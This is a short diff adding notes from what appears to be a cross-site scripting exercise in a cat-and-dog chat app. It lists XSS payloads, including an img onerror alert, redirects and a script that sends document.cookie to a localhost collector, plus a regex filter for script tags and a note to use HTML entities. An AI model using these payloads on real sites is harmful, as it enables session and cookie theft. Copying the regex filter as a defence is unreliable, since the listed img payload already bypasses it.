@@ -1,0 +1,16 @@
+REPAIR TRY 2: 
+Use html entities
+
+CAT TO DOG: <img src="blaa" onerror="alert('bla')">
+
+REPAIR TRY 1:
+
+    if (message.match(/<script[\s\S]*?>[\s\S]*?<\/script>/gi)) {
+        return res.send('No script tag allowed');        
+    }
+
+DOG TO CAT: <script>window.location.replace(`http://localhost:3001?cookies=${document.cookie}`)</script>
+
+CAT TO DOG: <script>window.location.replace("https://procatinator.com/")</script>
+
+DOG TO CAT: <script>alert('Haha, stupid cat!')</script>
